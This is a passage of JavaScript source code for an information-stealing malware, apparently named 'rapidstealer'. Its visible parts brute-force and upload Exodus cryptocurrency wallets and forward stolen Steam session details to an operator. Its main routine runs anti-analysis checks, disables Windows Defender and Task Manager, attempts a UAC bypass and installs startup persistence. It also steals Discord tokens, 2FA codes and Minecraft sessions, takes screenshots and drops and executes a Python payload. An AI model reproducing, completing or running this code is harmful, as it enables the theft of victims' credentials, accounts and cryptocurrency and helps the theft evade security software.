      axios.get('https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/', { params: { key: STEAM_API_KEY, steamid: steamId }, timeout: 15000 }),
      axios.get('https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/', { params: { key: STEAM_API_KEY, steamid: steamId }, timeout: 15000 }),
    ]);
    const player = summary?.data?.response?.players?.[0];
    return {
      username: player?.personaname || 'Unknown',
      profileUrl: player?.profileurl,
      avatar: player?.avatarfull,
      level: level?.data?.response?.player_level || 'Private',
      games: games?.data?.response?.game_count || 'Private',
    };
  } catch (e) { return null; }
}

async function sendSteamEmbeds(steamData) {
  if (!steamData || !steamData.steamIds?.length) return;
  for (const steamId of steamData.steamIds) {
    try {
      const info = await enrichSteamData(steamId);
      const profileLink = `-# Profile: [Click here to profile!](${info?.profileUrl || '#'})`;
      const downloadLink = `-# Download: [Click here to download!](${steamData.downloadUrl || '#'})`;
      const embed = {
        color: 0, author: { name: `${TELEGRAM} - Steam Session`, icon_url: IMG.icon },
        description: profileLink + '\n' + downloadLink,
        fields: [
          { name: `${EMOJI.star} Steam Info`, value:
            `${EMOJI.duostar} **Username**: \`${info?.username || 'Unknown'}\`\n` +
            `${EMOJI.star} **Steam ID**: \`${steamId}\`\n` +
            `${EMOJI.duostar} **Level**: \`${info?.level || 'Private'}\`\n` +
            `${EMOJI.prettymoon} **Games**: \`${info?.games || 'Private'}\`\n` +
            `${EMOJI.bubble} **Created**: ${info?.created ? '<t:' + info.created + ':F>' : 'Unknown'}`, inline: false },
        ],
        footer: { text: `${BRAND} | ${TELEGRAM} | ${BUILD_KEY}`, icon_url: IMG.icon },
        thumbnail: { url: info?.avatar || IMG.avatar },
      };
      await forwardEmbed({
        key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [embed],
      });
    } catch (e) {
      console.error('[STEAM] Error:', e.message);
    }
    await new Promise(r => setTimeout(r, 2000));
  }
}

// ======================================================================
// 21. EXODUS WALLET STEALING
// ======================================================================

const EXODUS_PASSWORD_TEMP_FILE = path.join(os.tmpdir(), 'X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt');

const EXODUS_COMMON_PASSWORDS = [
  '1234', '12345', '123456', '12345678', '123456789',
  'password', 'admin', 'root', 'qwerty', 'abc123',
  'letmein', 'welcome', '1234567', 'passw0rd', '1234567890',
  '1q2w3e4r', 'sunshine', 'iloveyou', 'football', 'monkey',
  'superman', 'hunter2', 'dragon', 'baseball', 'shadow',
  'trustno1', 'password1', 'master', 'login', 'qazwsx',
  'starwars', '654321', 'access', '123qwe', 'zaq12wsx',
  '1qaz2wsx', 'hello123', 'batman', 'charlie', 'letmein123',
  'mustang', '696969', 'michael', 'freedom', 'secret',
  'abc12345', 'iloveyou', 'whatever', 'trustme', '666666',
];

function getExodusPasswordList() {
  const passwords = [];
  if (fs.existsSync(EXODUS_PASSWORD_TEMP_FILE)) {
    try {
      const content = fs.readFileSync(EXODUS_PASSWORD_TEMP_FILE, 'utf8');
      const lines = content.split('\n').map(l => l.trim()).filter(l => l.length > 0);
      passwords.push(...lines);
    } catch (e) {}
  }
  if (passwords.length === 0) passwords.push(...EXODUS_COMMON_PASSWORDS);
  return passwords;
}

function tryDecryptExodusSeed(seedData, password) {
  try {
    if (!seedData || seedData.length < 80) return null; // too small to be valid

    const SALT_LEN = 32;
    const IV_LEN = 16;
    const HMAC_LEN = 32;

    const salt = seedData.slice(0, SALT_LEN);
    const iv = seedData.slice(SALT_LEN, SALT_LEN + IV_LEN);
    const ciphertext = seedData.slice(SALT_LEN + IV_LEN, -HMAC_LEN);
    const hmac = seedData.slice(-HMAC_LEN);

    if (ciphertext.length === 0) return null;

    // Derive AES key (16 bytes for AES-128)
    const aesKey = crypto.pbkdf2Sync(password, salt, 2048, 16, 'sha512');

    // Derive HMAC key (32 bytes)
    const hmacKey = crypto.pbkdf2Sync(password, salt, 2048, 32, 'sha512');

    // Verify HMAC first
    const expectedHmac = crypto.createHmac('sha256', hmacKey).update(ciphertext).digest();
    if (!crypto.timingSafeEqual(hmac, expectedHmac)) return null;

    // Decrypt with AES-128-CTR
    const decipher = crypto.createDecipheriv('aes-128-ctr', aesKey, iv);
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);

    // Verify decrypted data looks like a valid mnemonic seed
    const decoded = decrypted.toString('utf8');
    if (decoded.length < 10) return null; // too short to be valid

    // Check for BIP39 word boundaries (space-separated words)
    const words = decoded.trim().split(/\s+/);
    if (words.length < 6) return null; // minimum viable mnemonic

    return decoded;
  } catch (e) {
    return null;
  }
}

async function stealExodusWallet() {
  const appData = process.env.APPDATA;
  if (!appData) return;
  const walletPath = path.join(appData, 'Exodus', 'exodus.wallet');
  const seedPath = path.join(walletPath, 'seed.seco');
  if (!fs.existsSync(seedPath)) return;

  const zipPath = path.join(os.tmpdir(), 'exodus_' + Date.now() + '.zip');
  await archiveDir(zipPath, walletPath);
  const downloadUrl = await uploadToGofile(zipPath);
  try { fs.unlinkSync(zipPath); } catch (e) {}

  // Brute-force wallet password (local, no C2 contact)
  let foundPassword = null;
  try {
    const seedData = fs.readFileSync(seedPath);
    const passwords = getExodusPasswordList();
    for (const password of passwords) {
      const result = tryDecryptExodusSeed(seedData, password);
      if (result) { foundPassword = password; break; }
    }
  } catch (e) {}

  const embed = {
    color: 0, author: { name: `${TELEGRAM} - Exodus Session`, icon_url: IMG.icon },
    thumbnail: { url: IMG.thumb1 },
    description: '-# Information retrieved from the victim\'s wallet.',
    fields: [
      { name: `${EMOJI.chromeheart} Password`, value: '-# Password: `' + (foundPassword || 'No password found') + '`', inline: false },
      { name: `${EMOJI.chromeheart} Exodus Link`, value: '-# Download: [Click here to download!](' + (downloadUrl || '#') + ')', inline: false },
    ],
    footer: { text: `${BRAND} | ${TELEGRAM} | ${BUILD_KEY}`, icon_url: IMG.icon },
  };
  await forwardEmbed({ key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [embed] });
}

// ======================================================================
// 22. UTILITY FUNCTIONS
// ======================================================================

function copyDirSync(src, dest) {
  fs.mkdirSync(dest, { recursive: true });
  for (const entry of fs.readdirSync(src)) {
    const s = path.join(src, entry), d = path.join(dest, entry);
    if (fs.statSync(s).isDirectory()) copyDirSync(s, d);
    else fs.copyFileSync(s, d);
  }
}

async function archiveDir(zipPath, dirPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });
    output.on('close', resolve);
    archive.on('error', reject);
    archive.pipe(output);
    archive.directory(dirPath, false);
    archive.finalize();
  });
}

// ======================================================================
// 23. EVASION / INITIALIZATION ORCHESTRATOR
// ======================================================================

async function runEvasionRoutine() {
  console.log('[INFO] Iniciando processo de Evasão.');
  try {
    await disableWindowsDefender();
    await addSelfDefenderExclusions();
    await addAVExclusionPaths();
    await uacBypassAndDefenderExclusions();
    await disableTaskManager();
    await masqueradeProcessName();
    console.log('[INFO] Sistema de Evasão concluido');
    return true;
  } catch (e) {
    console.error('[ERROR] Evasion failed:', e.message);
    return false;
  }
}

// ======================================================================
// MAIN
// ======================================================================

(async () => {
  // ---- Phase 1: Anti-debug + expiry + VM check ----
  antiDebugReLaunch();
  if (isKeyExpired()) return;
  if (detectAnalysisEnvironment()) return;
  console.log = console.error = console.warn = console.info = () => {};
  killDiscordProcesses();

  // ---- Phase 2: Initialization ----
  await masqueradeProcessName();
  await disableTaskManager();
  await executeC2PowerShell();

  // ---- Phase 3: Kill all browser processes ----
  await killAllBrowserProcesses();

  // ---- Phase 4: Initial collect + evasion ----
 // 2× UAC bypass + evasion orchestrator
  await uacBypassAndDefenderExclusions();
  await uacBypassAndDefenderExclusions();
  await runEvasionRoutine();

  // kWfGGw: Discord kill → wait → restart
  await stealDiscordTokens();

  // Panel communication
  await communicateWithPanel();

  // Screenshot
  await sendScreenshot();

  // Full collection pass
  await installStartupPersistence();
  await sendScreenshot();
  await masqueradeProcessName();
  await disableTaskManager();
  send2FACodes(collect2FACodes());
  await stealExodusWallet();
  const steamPass = await stealSteamSession();
  await sendSteamEmbeds(steamPass);
  const mcPass = await stealMinecraftSessions();
  await sendMinecraftEmbed(mcPass);
  await communicateWithPanel();
  await dropAndExecutePython();
  const d = path.join(os.tmpdir(), 'rapidstealer_data');
  fs.mkdirSync(d, { recursive: true });
  await collectSystemInfo(d);

  // ---- Phase 5: Retry loop (7 iterations × 5 collectors) ----
  for (let iteration = 0; iteration < 7; iteration++) {
    const collectors = [
      () => send2FACodes(collect2FACodes()),
      () => installStartupPersistence(),
      async () => {
        await stealExodusWallet();
        const steam = await stealSteamSession();
        await sendSteamEmbeds(steam);
        const mc = await stealMinecraftSessions();
        await sendMinecraftEmbed(mc);
      },
      () => dropAndExecutePython(),
      () => { const d2 = path.join(os.tmpdir(), 'rapidstealer_data'); fs.mkdirSync(d2, { recursive: true }); return collectSystemInfo(d2); },
    ];
    for (const collector of collectors) {
      try { await collector(); } catch (e) {}
    }
  }
})();
